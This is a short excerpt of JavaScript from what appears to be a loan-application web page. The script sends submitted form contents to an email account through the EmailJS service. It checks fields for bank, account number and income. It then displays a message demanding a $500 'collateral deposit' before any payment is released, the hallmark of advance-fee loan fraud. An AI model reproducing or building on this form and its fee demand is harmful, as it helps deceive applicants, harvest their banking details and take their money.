...
window.onload = function() {
    document.getElementById('contact-form').addEventListener('submit', function(event) {
        ...
        emailjs.sendForm("service_k68fk3o","template_8pcytze", this)
        .then(function() {
            console.log('SUCCESS!');
...
function validate(){
    ...
    if(count === 1){
        ...
        A collateral deposit of $500 is required before making any payment towards your account , 
...
setInterval(nub, 100)
function nub(){
    if(duration.value === "" || account.value === "" || bank.value === "" || income.value === ""){
